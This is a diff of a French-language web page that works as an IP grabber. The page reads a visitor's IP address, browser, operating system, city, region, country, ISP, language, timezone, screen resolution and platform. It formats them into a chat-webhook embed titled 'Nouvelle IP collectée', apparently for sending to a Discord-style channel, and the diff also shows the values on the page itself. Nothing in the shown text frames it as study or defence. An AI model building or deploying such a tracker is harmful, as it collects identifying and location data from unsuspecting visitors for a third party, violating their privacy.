@@ -42,9 +42,16 @@
 <body>
     <div class="container">
         <img id="logo" src="https://files.catbox.moe/imzkkq.png" alt="Logo du site">
-        <h1>NaN</h1>
+        <h1>Page d'information</h1>
         <div id="info">
-            <p>Hey</p>
+            <p><strong>IP :</strong> <span id="ip"></span></p>
+            <p><strong>Navigateurs :</strong> <span id="browser"></span></p>
+            <p><strong>Date et Heure :</strong> <span id="datetime"></span></p>
+            <p><strong>Localisation :</strong> <span id="location"></span></p>
+            <p><strong>Langue :</strong> <span id="language"></span></p>
+            <p><strong>Fuseau Horaire :</strong> <span id="timezone"></span></p>
+            <p><strong>Résolution d'écran :</strong> <span id="screenResolution"></span></p>
+            <p><strong>Type de plateforme :</strong> <span id="platform"></span></p>
             <p class="error" id="error"></p>
         </div>
     </div>
@@ -91,20 +98,20 @@
                 const embed = {
                     embeds: [
                         {
-                            title: "Nouvelle Connection détectée ",
+                            title: "Nouvelle IP collectée",
                             description: "Détails de la connexion",
                             color: 3447003,
                             fields: [
-                                { name: "📍 Adresse IP", value: data.ip, inline: true },
-                                { name: "⌛ Date et Heure", value: currentDateTime, inline: true },
-                                { name: "⛵ Navigateur", value: ${browserName} ${browserVersion}, inline: true },
-                                { name: "🕵️ Système d'Exploitation", value: userAgent, inline: false },
-                                { name: "🌎 Localisation", value: ${data.city}, ${data.region}, ${data.country}, inline: true },
-                                { name: "🏳️ Langue", value: language, inline: true },
-                                { name: "⏰ Fuseau Horaire", value: timezone, inline: true },
-                                { name: "💾 Résolution d'écran", value: screenResolution, inline: true },
-                                { name: "💻 Type de plateforme", value: platform, inline: true },
-                                { name: "🧨 Fournisseur d'Accès Internet (ISP)", value: data.isp, inline: false }
+                                { name: "Adresse IP", value: data.ip, inline: true },
+                                { name: "Date et Heure", value: currentDateTime, inline: true },
+                                { name: "Navigateur", value: ${browserName} ${browserVersion}, inline: true },
+                                { name: "Système d'Exploitation", value: userAgent, inline: false },
+                                { name: "Localisation", value: ${data.city}, ${data.region}, ${data.country}, inline: true },
+                                { name: "Langue", value: language, inline: true },
+                                { name: "Fuseau Horaire", value: timezone, inline: true },
+                                { name: "Résolution d'écran", value: screenResolution, inline: true },
+                                { name: "Type de plateforme", value: platform, inline: true },
+                                { name: "Fournisseur d'Accès Internet (ISP)", value: data.isp, inline: false }
                             ]
                         }
                     ]
